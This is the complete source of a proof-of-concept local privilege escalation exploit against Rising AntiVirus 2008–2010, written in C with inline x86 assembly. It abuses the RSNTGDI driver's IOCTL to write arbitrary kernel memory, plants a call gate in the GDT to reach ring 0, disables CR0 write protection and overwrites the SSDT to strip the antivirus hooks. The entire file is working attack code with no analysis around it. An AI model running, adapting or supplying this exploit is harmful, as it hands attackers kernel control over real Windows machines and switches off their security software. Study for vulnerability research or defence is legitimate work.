//by Dlrow   dlrow1991@ymail.com<mailto:dlrow1991@ymail.com>

//restore all ssdt hooks

// Rising0day.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
enum { SystemModuleInformation = 11 };
typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
HANDLE g_RsGdiHandle = 0 ;
void __stdcall WriteKVM(PVOID Address , ULONG Value)
{
 ULONG ColorValue = Value ;
 ULONG btr ;
 ULONG ColorBuffer = 0 ;

 DeviceIoControl(g_RsGdiHandle ,
  0x83003C0B,
  &ColorValue ,
  sizeof(ULONG),
  &ColorBuffer ,
  sizeof(ULONG),
  &btr ,
  0
  );
 DeviceIoControl(g_RsGdiHandle ,
  0x83003C0B,
  &ColorValue ,
  sizeof(ULONG),
  Address ,
  sizeof(ULONG),
  &btr ,
  0
  );
 return ;
}
void AddCallGate()
{
 ULONG Gdt_Addr;
 ULONG CallGateData[0x4];
 ULONG Icount;
 __asm
 {
  push edx
  sgdt [esp-2]
  pop edx
  mov Gdt_Addr , edx
 }
 __asm
 {

  push 0xc3
  push Gdt_Addr
  call WriteKVM
  mov eax,Gdt_Addr
  mov word ptr[CallGateData],ax
  shr eax,16
  mov word ptr[CallGateData+6],ax
  mov dword ptr[CallGateData+2],0x0ec0003e8
  mov dword ptr[CallGateData+8],0x0000ffff
  mov dword ptr[CallGateData+12],0x00cf9a00
  xor eax,eax
LoopWrite:
  mov edi,dword ptr CallGateData[eax]

  push edi
  mov edi,Gdt_Addr
  add edi,0x3e0
  add edi,eax
  push edi
  mov Icount,eax
  call WriteKVM
  mov eax,Icount
  add eax , 0x4
  cmp eax,0x10
  jnz LoopWrite
 }

 return ;
}

void IntoR0(PVOID function)
{
 WORD Callgt[3];
 Callgt[0] = 0;
 Callgt[1] = 0;
 Callgt[2] = 0x3e3;
 __asm
 {
  call fword ptr[Callgt]
  mov eax,esp
  mov esp,[esp+4]
  push eax
  call function
  pop esp
  push offset ring3Ret
  retf
ring3Ret:
  nop
 }
 return ;

}
#pragma pack(1)
typedef struct _IDTR
{
 SHORT  IDTLimit;
 UINT  IDTBase;
}IDTR,
 *PIDTR,
 **PPIDTR;
#pragma pack()
ULONG g_RealSSDT = 0 ;
ULONG ServiceNum = 0 ;
ULONG OrgService [0x1000] ;
ULONG RvaToOffset(IMAGE_NT_HEADERS *NT, ULONG Rva)
{
 ULONG Offset = Rva, Limit;
 IMAGE_SECTION_HEADER *Img;
 WORD i;

 Img = IMAGE_FIRST_SECTION(NT);

 if (Rva < Img->PointerToRawData)
  return Rva;

 for (i = 0; i < NT->FileHeader.NumberOfSections; i++)
 {
  if (Img[i].SizeOfRawData)
   Limit = Img[i].SizeOfRawData;
  else
   Limit = Img[i].Misc.VirtualSize;

  if (Rva >= Img[i].VirtualAddress &&
   Rva < (Img[i].VirtualAddress + Limit))
  {
   if (Img[i].PointerToRawData != 0)
   {
    Offset -= Img[i].VirtualAddress;
    Offset += Img[i].PointerToRawData;
   }

   return Offset;
  }
 }

 return 0;
}
#define ibaseDD *(PDWORD)&ibase
DWORD GetHeaders(PCHAR ibase, PIMAGE_FILE_HEADER *pfh, PIMAGE_OPTIONAL_HEADER *poh, PIMAGE_SECTION_HEADER *psh)
{
    PIMAGE_DOS_HEADER mzhead=(PIMAGE_DOS_HEADER)ibase;
    if ((mzhead->e_magic!=IMAGE_DOS_SIGNATURE)||(ibaseDD[mzhead->e_lfanew]!=IMAGE_NT_SIGNATURE)) return FALSE;
    *pfh=(PIMAGE_FILE_HEADER)&ibase[mzhead->e_lfanew];
    if (((PIMAGE_NT_HEADERS)*pfh)->Signature!=IMAGE_NT_SIGNATURE) return FALSE;
    *pfh=(PIMAGE_FILE_HEADER)((PBYTE)*pfh+sizeof(IMAGE_NT_SIGNATURE));
    *poh=(PIMAGE_OPTIONAL_HEADER)((PBYTE)*pfh+sizeof(IMAGE_FILE_HEADER));
    if ((*poh)->Magic!=IMAGE_NT_OPTIONAL_HDR32_MAGIC) return FALSE;
    *psh=(PIMAGE_SECTION_HEADER)((PBYTE)*poh+sizeof(IMAGE_OPTIONAL_HEADER));
    return TRUE;
}
typedef struct {
    WORD    offset:12;
    WORD    type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;
#define RVATOVA(base,offset) ((PVOID)((DWORD)(base)+(DWORD)(offset)))
DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT , PULONG ImageBase)
{
    PIMAGE_FILE_HEADER    pfh;
    PIMAGE_OPTIONAL_HEADER    poh;
    PIMAGE_SECTION_HEADER    psh;
    PIMAGE_BASE_RELOCATION    pbr;
    PIMAGE_FIXUP_ENTRY    pfe;

    DWORD    dwFixups=0,i,dwPointerRva,dwPointsToRva,dwKiServiceTable;
    BOOL    bFirstChunk;

    GetHeaders((PCHAR)hModule,&pfh,&poh,&psh);

    if ((poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) &&
        (!((pfh->Characteristics)&IMAGE_FILE_RELOCS_STRIPPED))) {

        pbr=(PIMAGE_BASE_RELOCATION)RVATOVA(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,hModule);
        bFirstChunk=TRUE;
        while (bFirstChunk || pbr->VirtualAddress) {
            bFirstChunk=FALSE;

            pfe=(PIMAGE_FIXUP_ENTRY)((DWORD)pbr+sizeof(IMAGE_BASE_RELOCATION));

            for (i=0;i<(pbr->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))>>1;i++,pfe++) {
                if (pfe->type==IMAGE_REL_BASED_HIGHLOW) {
                    dwFixups++;
                    dwPointerRva=pbr->VirtualAddress+pfe->offset;
                    dwPointsToRva=*(PDWORD)((DWORD)hModule+dwPointerRva)-(DWORD)poh->ImageBase;

                    if (dwPointsToRva==dwKSDT)
     {
                        if (*(PWORD)((DWORD)hModule+dwPointerRva-2)==0x05c7)
      {
                            dwKiServiceTable=*(PDWORD)((DWORD)hModule+dwPointerRva+4)-poh->ImageBase;
       *ImageBase = poh->ImageBase;
                            return dwKiServiceTable;
                        }
                    }

                }
            }
            *(PDWORD)&pbr+=pbr->SizeOfBlock;
        }
    }

    return 0;
}
DWORD CR0Reg ;
ULONG realssdt ;
void InKerneProc()
{
 __asm
 {
  cli
  mov eax, cr0
  mov CR0Reg,eax
  and eax,0xFFFEFFFF
  mov cr0, eax
 }
 int i;
 for (i = 0; i < (int)ServiceNum; i++)
 {
  *(ULONG*)(*(ULONG*)realssdt + i * sizeof(ULONG)) = OrgService[i];
 }
 __asm
 {
  mov eax, CR0Reg
  mov cr0, eax
  sti
 }

}
int main(int argc, char* argv[])
{
 printf("Rising AntiVirus 2008 ~ 2010 \n"
  "Local Privilege Escalation Vulnerability Proof Of Concept Exploit\n 2010-1-27\n");

     g_RsGdiHandle = CreateFile("\\\\.\\RSNTGDI" ,
  0,
  FILE_SHARE_READ | FILE_SHARE_WRITE ,
  0,
  OPEN_EXISTING , 0 , 0 );
 if (g_RsGdiHandle == INVALID_HANDLE_VALUE)
 {
  return 0 ;
 }

 SYSTEM_MODULE_INFORMATION ModuleInfo ;

 // Learn the loaded kernel (e.g. NTKRNLPA vs NTOSKRNL), and it's base address

 HMODULE hlib = GetModuleHandle("ntdll.dll");
 PVOID pNtQuerySystemInformation = GetProcAddress(hlib , "NtQuerySystemInformation");
 ULONG infosize = sizeof(ModuleInfo);

 __asm
 {
  push 0
  push infosize
  lea eax , ModuleInfo
  push eax
  push 11
  call pNtQuerySystemInformation
 }

 HMODULE KernelHandle ;
 LPCSTR ntosname = (LPCSTR)((ULONG)ModuleInfo.Module[0].ImageName + ModuleInfo.Module[0].PathLength);

    // Load the kernel image specified
 KernelHandle = LoadLibrary(ntosname);
 if (KernelHandle == 0 )
 {
  return 0 ;
 }

 ULONG KeSSDT = (ULONG)GetProcAddress(KernelHandle , "KeServiceDescriptorTable");

 if (KeSSDT == 0 )
 {
  return 0 ;
 }
 ULONG ImageBase = 0 ;
 ULONG KiSSDT = FindKiServiceTable(KernelHandle , KeSSDT - (ULONG)KernelHandle , &ImageBase);
 if (KiSSDT == 0 )
 {
  return 0 ;
 }
 KiSSDT += (ULONG)KernelHandle;
 ServiceNum = 0x11c ;
 ULONG i ;

 for (i = 0 ; i < ServiceNum ; i ++)
 {
  OrgService[i] = *(ULONG*)(KiSSDT + i * sizeof(ULONG)) + (ULONG)ModuleInfo.Module[0].Base - ImageBase;
 }

 realssdt = KeSSDT - (ULONG)KernelHandle + (ULONG)ModuleInfo.Module[0].Base;

 SetThreadAffinityMask(GetCurrentThread () , 0 ) ;

 AddCallGate();
 IntoR0(InKerneProc);
 return 0;
}